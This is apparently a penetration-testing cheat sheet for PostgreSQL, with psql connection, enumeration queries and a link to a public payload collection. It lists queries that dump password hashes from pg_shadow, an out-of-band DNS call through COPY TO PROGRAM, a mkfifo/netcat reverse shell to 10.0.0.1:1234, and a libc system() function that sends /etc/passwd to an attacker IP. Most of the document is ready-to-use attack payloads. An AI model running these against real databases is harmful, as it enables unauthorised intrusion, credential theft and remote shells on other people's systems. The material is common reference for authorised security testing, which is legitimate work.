### postgresql Connect
```bash
psql -h 192.168.100.11 -U postgres
```

### Enumeration
```bash
# DBMS Version
SELECT version()
# Database name
SELECT CURRENT_DATABASE()
# Database Schema
SELECT CURRENT_SCHEMA()
# List PostgreSQL Users
SELECT usename FROM pg_user
# List Password Hashes
SELECT usename, passwd FROM pg_shadow
# List DB Administrators
SELECT usename FROM pg_user WHERE usesuper IS TRUE
# Current Users
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```

### PostgreSQL Methodology
```bash
# List Schemas
SELECT DISTINCT(schemaname) FROM pg_tables
# List Databases
SELECT datname FROM pg_database
# List Tables
SELECT table_name FROM information_schema.tables;
SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>';
SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'
# List Columns
SELECT column_name FROM information_schema.columns WHERE table_name='data_table'

```

### OOB
```bash
# OOB 
COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

### RCE
```bash
# RCE 
CREATE TABLE shell(output text); COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
# RCE (Using libc.so.6)
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution)

